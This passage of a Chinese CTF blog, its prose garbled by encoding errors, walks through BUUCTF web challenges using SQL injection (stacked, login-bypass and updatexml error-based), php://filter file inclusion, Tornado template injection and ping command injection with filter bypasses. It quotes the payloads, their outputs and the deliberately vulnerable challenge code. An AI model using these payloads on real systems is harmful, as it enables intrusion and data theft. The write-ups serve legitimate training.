&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="è§£æ³•1ï¼š"><a href="#è§£æ³•1ï¼š" class="headerlink" title="è§£æ³•1ï¼š"></a>è§£æ³•1ï¼š</h4><p><strong>Payload</strong>ï¼š<code>*,1</code>  ===&gt;    <code>select *,1||flag from Flag;</code>ï¼Œ </p>
<p><code>1||flag</code>ä½œä¸ºä¸€ä¸ªç»“æœä¸ºbooleanç±»å‹çš„å€¼ç›¸å½“äº1ã€‚ï¼ˆå¦‚æœæ˜¯*,0 åˆ™0||flagä¸º0falseï¼‰ï¼Œå› æ­¤æ‰§è¡Œæ ¸å¿ƒæŸ¥è¯¢è¯­å¥<code>select * from Flag</code></p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/0fZZNt"><img src="https://s1.ax1x.com/2020/10/13/0fZZNt.png" alt="0fZZNt.png"></a></p>
<h4 id="è§£æ³•2ï¼š"><a href="#è§£æ³•2ï¼š" class="headerlink" title="è§£æ³•2ï¼š"></a>è§£æ³•2ï¼š</h4><p>æŠŠè¿™ä¸ª<code>||</code>æˆ–å­—ç¬¦å’±ä»¬ç»™å®ƒè¿ç”¨ä¸Šï¼Œè¿™é‡Œæ¶‰åŠåˆ°Mysqlçš„<code>sql_mode</code>çš„è®¾ç½®ï¼Œé€šè¿‡å˜é‡çš„æ–¹å¼å»é…ç½®å®ƒã€‚</p>
<blockquote>
<p>sql_mode : å®ƒå®šä¹‰äº† MySQL åº”æ”¯æŒçš„ SQL è¯­æ³•ï¼Œä»¥åŠåº”è¯¥åœ¨æ•°æ®ä¸Šæ‰§è¡Œä½•ç§ç¡®è®¤æ£€æŸ¥ï¼Œå…¶ä¸­çš„PIPES_AS_CONCATå°† ||è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œé â€œæˆ–â€ è¿ç®—ç¬¦ </p>
</blockquote>
<p>å› æ­¤å½“<code>set sql_mode=PIPES_AS_CONCAT</code>æ—¶ï¼Œè¿™ä¸ª<code>||</code>å°±ç›¸å½“äºå­—ç¬¦ä¸²è¿æ¥å‡½æ•°concat(â€˜â€™,â€™â€™)è¾£ã€‚</p>
<p><strong>payload:</strong><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
<p>ç›¸å½“äºï¼š<code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code>ï¼Œè¿™é‡Œ<code>1||flag</code> ==&gt; <code>concat(1,&#39;flag&#39;)</code></p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/0fZjKg"><img src="https://s1.ax1x.com/2020/10/13/0fZjKg.png" alt="0fZjKg.png"></a></p>
<h4 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a><strong>æ€»ç»“ï¼š</strong></h4><p>å¸Œæœ›ä»è¿™é‡Œå­¦ä¹ åˆ°ä¸€äº›æ–°æ€è·¯ï¼Œåœ¨é‡åˆ°å †å æ³¨å…¥æœ‰ç‰¹æ®Šçš„å­—ç¬¦æ—¶ï¼Œå¯ä»¥æ€è€ƒsql_modeè¿™ä¸ªè®¾ç½®ï¼Œèƒ½å¦å°†ç‰¹æ®Šå­—ç¬¦å˜å¾—åˆç†å¯åˆ©ç”¨åŒ–ã€‚</p>
<h3 id="ä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#ä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="ä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>ä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h3><p>â€‹    F12æ‰¾ç¬¬ä¸€ä¸ªè¶…é“¾æ¥Archive_room.phpï¼Œç„¶åæœ‰ä¸€ä¸ªbuttonæ˜¯ç¬¬äºŒä¸ªè¶…é“¾æ¥action.phpï¼Œç‚¹å‡»åå‘ç°302ç›´æ¥é‡å®šå‘åˆ°äº†end.phpï¼ŒbpæŠ“åŒ…çœ‹åˆ°äº†è¿™ä¸ªç¥ç§˜å¾—å°å®¶ä¼™ï¼Œsecr3t.phpã€‚</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/B3RuKx"><img src="https://s1.ax1x.com/2020/10/28/B3RuKx.png" alt="B3RuKx.png"></a></p>
<p>â€‹    secr3t.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>OKï¼Œå…¸å‹çš„æ–‡ä»¶åŒ…å«ï¼ŒåŒ…å«ä¸€ä¸‹flag.phpï¼Œå‘ç°æ²¡æœ‰æ˜¾ç¤ºflagï¼Œé‚£å°±filter/convert.base64-encodeä¸€ä¸‹å­ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://6f0fd2e6-afd9-415d-8fd6-4680e8378419.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MDYyNWY3OGItOTVhOC00NGMxLThjNzctOGNhMjBhNTFjNGQ4fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure>

<p>è§£ç å¦‚ä¸‹ï¼Œå¾—åˆ°ç¦æ¥é˜ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;å•Šå“ˆï¼ä½ æ‰¾åˆ°æˆ‘äº†ï¼å¯æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;æˆ‘å°±åœ¨è¿™é‡Œ&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;0625f78b-95a8-44c1-8c77-8ca20a51c4d8&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="å››ã€-æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#å››ã€-æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="å››ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>å››ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h3><p>Payloadï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://1cd20fd9-e3fc-4a11-bb8e-0f7fe320e955.node3.buuoj.cn/check.php?username=1&amp;password=1<span class="string">&#x27; or 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">flag&#123;bb4a6d90-768f-46e4-9a77-c8972f164c59&#125;</span><br></pre></td></tr></table></figure>

<h3 id="äº”ã€-ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#äº”ã€-ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="äº”ã€[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>äº”ã€[ACTF2020 æ–°ç”Ÿèµ›]Include</h3><p>å¼€å±€é¢„æµ‹index.phpä¼ å…¥file=ï¼Œæ˜¯ä¸ªæ–‡ä»¶åŒ…å«æ¥å£ï¼Œfile=index.phpæ—¶ç½‘é¡µæœ‰ç‚¹å¡ï¼Œä¼°è®¡æ˜¯å¾ªç¯åŒ…å«äº†ï¼Œåº”è¯¥ç”¨çš„ä¸æ˜¯_onceå‡½æ•°ï¼Œfilteræ¥base64ä¸€æ³¢å§ã€‚è§£ä¸‹flag.phpæºç å¦‚ä¸‹â€¦</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;86976d68-2fe1-46be-82fd-a32375998501&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å†çœ‹çœ‹index.phpå‘¢ï¼Œå˜»å˜»æ˜¯include</p>
<blockquote>
<p>includeä¸requireé™¤äº†åœ¨å¤„ç†å¼•å…¥æ–‡ä»¶çš„æ–¹å¼ä¸åŒå¤–ï¼Œæœ€å¤§çš„åŒºåˆ«å°±æ˜¯ï¼š<br>includeåœ¨å¼•å…¥ä¸å­˜æ–‡ä»¶æ—¶äº§ç”Ÿä¸€ä¸ªè­¦å‘Šä¸”è„šæœ¬è¿˜ä¼šç»§ç»­æ‰§è¡Œï¼Œ<br>requireåˆ™ä¼šå¯¼è‡´ä¸€ä¸ªè‡´å‘½æ€§é”™è¯¯ä¸”è„šæœ¬åœæ­¢æ‰§è¡Œã€‚</p>
<p>èŠ‚é€‰è‡ªï¼šincludeå’Œrequireçš„åŒºåˆ«(wwlww)ï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wwlww/p/8413347.html">https://www.cnblogs.com/wwlww/p/8413347.html</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">&quot;php://input&quot;</span>) || stristr($file,<span class="string">&quot;zip://&quot;</span>) || stristr($file,<span class="string">&quot;phar://&quot;</span>) || stristr($file,<span class="string">&quot;data:&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="å…­ã€-æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#å…­ã€-æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="å…­ã€[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>å…­ã€[æŠ¤ç½‘æ¯ 2018]easy_tornado</h3><p>å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œåœ¨error?msg=å¤„ã€‚</p>
<blockquote>
<p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡,è¿™é‡Œç”¨åˆ°çš„æ˜¯handler.settingsï¼Œhandler æŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€ä»¥handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„ä¸€äº›ç¯å¢ƒå˜é‡</p>
<p>å¼•è‡ªç¬‘èŠ±å¤§ç‹:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12285121.html">https://www.cnblogs.com/xhds/p/12285121.html</a></p>
</blockquote>
<p>Payloadï¼š<code>http://9cd5726b-c9b8-43db-84ed-1c786f46bbc1.node3.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
<p>å¯è·å¾—ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­åŒ…æ‹¬äº†cookie_secret</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;autoreload&#x27;</span>: True, <span class="string">&#x27;compiled_template_cache&#x27;</span>: False, <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;e9d83199-02cc-4dc0-9c5e-db259e149331&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®hints.txtçš„æç¤ºï¼Œ./fllllllllllllagåº”è¯¥ä¼ å…¥çš„filehash=md5(cookie_secret+md5(filename))ï¼Œè®¡ç®—è¿‡ç¨‹å¦‚ä¸‹ï¼Œæ­¤è®¡ç®—è¿‡ç¨‹æˆ‘ç›´æ¥ä½¿ç”¨äº†æµè§ˆå™¨æ’ä»¶Hasherï¼Œå®ƒçœŸçš„å¾ˆæ£’ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5(/fllllllllllllag) = 3bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">cookie_secret = e9d83199-02cc-4dc0-9c5e-db259e149331</span><br><span class="line">md5(e9d83199-02cc-4dc0-9c5e-db259e1493313bf9f6cf685a6dd8defadabfb41a03a1)=f8f08978b32c8b0786ff90a4b4379ea1</span><br></pre></td></tr></table></figure>
<p>å¦å¤–ï¼Œç›´æ¥ç”¨python3çš„hashlibåº“ä¹Ÿå¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashlib.md5(bytes(<span class="string">&#x27;e9d83199-02cc-4dc0-9c5e-db259e149331&#x27;</span> + hashlib.md5(<span class="string">b&#x27;/fllllllllllllag&#x27;</span>).hexdigest(), encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br></pre></td></tr></table></figure>

<p>Payload:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://9cd5726b-c9b8-43db-84ed-1c786f46bbc1.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=f8f08978b32c8b0786ff90a4b4379ea1</span><br><span class="line"></span><br><span class="line">flag&#123;d8bd1174-f15f-49cf-8c10-8a861e4f7b0b&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ä¸ƒã€-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#ä¸ƒã€-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="ä¸ƒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>ä¸ƒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h3><p>â€‹    å’Œç¬¬äº”é¢˜ä¸€æ ·ï¼Œå¯ä»¥orä¸‡èƒ½å¯†ç æ³¨å…¥ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=1&amp;password=1234<span class="string">&#x27; or 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">Your password is <span class="string">&#x27;70b75a27bc538ac305baffd8aaa79259&#x27;</span></span><br></pre></td></tr></table></figure>

<p>â€‹    æ­¤æ—¶å‘ç°ç™»é™†æˆåŠŸåä¸ç›´æ¥ç»™flagäº†ï¼Œå°è¯•æŠ¥é”™æ³¨å…¥å§ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">æ•°æ®åº“ï¼šhttp://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^sh<span class="string">&#x27;,(select database()),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;^geek^&#x27;</span></span><br><span class="line">------------------------------</span><br><span class="line">æ•°æ®è¡¨ï¼šhttp://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^<span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;^geekuser,l0ve1ysq1^&#x27;</span></span><br><span class="line">-------------------------------</span><br><span class="line">çˆ†l0ve1ysq1çš„å­—æ®µï¼šhttp://49e8ad85-99a8-4813-bf93-sh1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^<span class="string">&#x27;,(select substr(group_concat(column_name),1,20) from information_schema.columns where  table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;^id,username,password^&#x27;</span></span><br><span class="line">--------------------------------</span><br><span class="line">Flagå°±åœ¨10ve1ysq1è¡¨ä¸­çš„passwordå­—æ®µä¸­ï¼Œåœ¨248ä»¥åï¼š</span><br><span class="line">http://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^<span class="string">&#x27;,(select substr(group_concat(password),248,31) from l0ve1ysq1),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">flag&#123;690ae2e0-9ddf-41e9-a7f6-bc878dd458e3&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/B8SxJJ"><img src="https://s1.ax1x.com/2020/10/28/B8SxJJ.png" alt="B8SxJJ.png"></a></p>
<h3 id="å…«ã€-GXYCTF2019-Ping-Ping-Ping"><a href="#å…«ã€-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="å…«ã€[GXYCTF2019]Ping Ping Ping"></a>å…«ã€[GXYCTF2019]Ping Ping Ping</h3><p>pingå‘½ä»¤æ³¨å…¥ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ã€é‡å®šå‘ç¬¦ã€å•åŒå¼•å·ã€catã€‚å¹¶ä¸”åªè¦å­—ç¬¦ä¸²ä¸­é¡ºåºå‡ºç°flagï¼Œä¸ç®¡å…¶ä¸­åˆ†éš”å¤šå°‘å­—ç¬¦ï¼Œéƒ½è¢«æ£€æµ‹åˆ°ã€‚ä¾‹å¦‚:<code>f123l123a123g123</code>ï¼Œè¿™ç§çš„è¯è¿˜æ˜¯å¯ä»¥è¢«æ£€æµ‹åˆ°ï¼Œä¸çŸ¥é“ç”¨äº†å•¥æ¥å£å„¿ï¼Œç­‰ä¸‹å“¥å“¥çœ‹çœ‹æºç å„¿ã€‚</p>
<p>è§£å†³æ–¹æ³•æ˜¯è¿™é‡Œä½¿ç”¨å˜é‡æ‹¼æ¥ï¼Œä¸”flagæ‹¼æ¥çš„é¡ºåºé¢ å€’ï¼Œ$IFSä»£æ›¿ç©ºæ ¼çš„æ–¹å¼ç»•è¿‡ã€‚</p>
<p>Payloadï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://bd478ba2-5157-4cab-8148-49f83abe0e37.node3.buuoj.cn/?ip=;b=g.php;a=fla;tac<span class="variable">$IFS</span><span class="variable">$a</span><span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;71c116c7-dc50-402d-b24e-e91afaedae83&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>çœ‹çœ‹æºç å„¿å•¥æ ·</p>
<p>Payloadï¼š<code>?ip=;b=x.php;a=inde;cat$IFS$a$b|base64;</code>å®Œäº†è§£ç å„¿ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="ä¹ã€-RoarCTF-2019-Easy-Calc"><a href="#ä¹ã€-RoarCTF-2019-Easy-Calc" class="headerlink" title="ä¹ã€[RoarCTF 2019]Easy Calc"></a>ä¹ã€[RoarCTF 2019]Easy Calc</h3><blockquote>
<p>æ€»ç»“ï¼šç©ºæ ¼+å˜é‡åç»•è¿‡WAFæ£€æµ‹ï¼Œchr()æ‹¼æ¥ç»•è¿‡æ­£åˆ™è¿‡æ»¤ã€‚</p>
</blockquote>
<p>æŸ¥çœ‹æºç å„¿ï¼Œè¾“å…¥çš„è¡¨è¾¾å¼è¢«URLç¼–ç åä½œä¸ºå‚æ•°ä¼ é€’åˆ°calc.phpä¸­ï¼ŒæŸ¥çœ‹ä¸€ä¸‹calc.phpæºç </p>
